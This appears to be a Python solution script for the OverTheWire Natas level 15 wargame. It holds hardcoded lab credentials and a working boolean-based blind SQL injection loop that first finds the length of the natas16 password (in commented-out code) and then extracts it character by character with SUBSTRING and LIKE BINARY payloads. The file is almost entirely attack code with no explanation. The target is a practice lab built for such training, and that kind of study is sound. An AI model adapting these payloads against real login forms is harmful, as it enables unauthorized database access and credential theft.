# /////////////////To find Passowrd length//////////////////////

# import requests
# from requests.auth import HTTPBasicAuth
# from bs4 import BeautifulSoup

# # Define the URL and credentials
# url = 'http://natas15.natas.labs.overthewire.org/'
# username = 'natas15'
# password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

# # SQL Injection payload
# # payload = 'natas16" or "1"="1;--'
# # payload = input("enter payload:\t")
# for i in range(0,50):
#     payload = f'natas16" AND LENGTH(password) = {i};-- '
              

#     data = {
#         'username': payload,
#         'password': 'anything'
#     }
#     response = requests.post(url, auth=HTTPBasicAuth(username, password), data=data)
#     soup = BeautifulSoup(response.text, 'lxml')
#     content_div = soup.find('div', id='content')
#     if content_div:
#         if content_div.get_text(strip=True) == "This user exists.View sourcecode":
#             print(f"password length is {i}")
#             break
#     else:
#         print("Content not found.")



# /////////////////To find Passowrd //////////////////////

import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

# Define the URL and credentials
url = 'http://natas15.natas.labs.overthewire.org/'
username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

passkey = []
password_length = 32
for j in range(1, password_length+1):
  print(f"Searching {j} character...")
  for k in ([chr(i) for i in range(ord('a'), ord('z') + 1)] + [chr(i) for i in range(ord('A'), ord('Z') + 1)] + [1,2,3,4,5,6,7,8,9,0]):
    # In mysql there is no difference in capital letters an dsamll letters...
    payload = f'natas16" AND SUBSTRING(password, {j}, 1) like binary "{k}";-- '
          
    data = {
        'username': payload,
        'password': 'anything'
    }
    response = requests.post(url, auth=HTTPBasicAuth(username, password), data=data)
    soup = BeautifulSoup(response.text, 'lxml')
    content_div = soup.find('div', id='content')
    if content_div.get_text(strip=True)== "This user exists.View sourcecode" :
        print(f"Got {j} character: {k}" )
        passkey.append(str(k))
        break
print("Password is ", ''.join(passkey))

